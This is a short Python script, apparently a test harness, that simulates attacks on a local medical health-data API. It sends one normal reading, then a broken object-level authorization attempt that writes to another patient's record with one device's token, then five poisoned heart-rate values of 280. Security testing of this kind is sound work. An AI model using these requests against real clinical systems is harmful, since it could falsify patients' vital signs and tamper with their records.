import requests
import time
from datetime import datetime, timezone

URL = "http://127.0.0.1:8000/api/v1/health-data"

def send_payload(device_id, patient_id, hr, token, attack_name=""):
    timestamp = datetime.now(timezone.utc).isoformat().replace('+00:00', 'Z')
    payload = {
        "device_id": device_id,
        "patient_id": patient_id,
        "timestamp": timestamp,
        "metrics": {"heart_rate": hr, "spo2": 98, "systolic_bp": 120, "diastolic_bp": 80},
        "signal_quality": 0.95,
        "battery_level": 80,
        "seq_no": int(time.time()),
        "token": token
    }
    try:
        res = requests.post(URL, json=payload, timeout=2)
        print(f"[{attack_name}] HR:{hr} | Target Patient:{patient_id} | Status:{res.status_code}")
    except:
        print(f"[{attack_name}] ❌ Failed to connect.")

if __name__ == "__main__":
    print("[*] Starting Adversarial Attack against Medical Pipeline...\n")
    
    print("[*] Phase 1: Normal Data Ingestion...")
    send_payload("dev_001", "pt_001", 75, "VALID_TOKEN_DEV1", "NORMAL")
    time.sleep(2)

    print("\n[!] Phase 2: Broken Object Level Authorization (BOLA )...")
    send_payload("dev_001", "pt_002", 75, "VALID_TOKEN_DEV1", "ATTACK-BOLA")
    time.sleep(2)

    print("\n[!] Phase 3: Adversarial Data Poisoning Attack ...")
    for i in range(5):
        send_payload("dev_001", "pt_001", 280, "VALID_TOKEN_DEV1", "ATTACK-POISON")
        time.sleep(0.2)
        
    print("\n[*] Attack Simulation Completed.")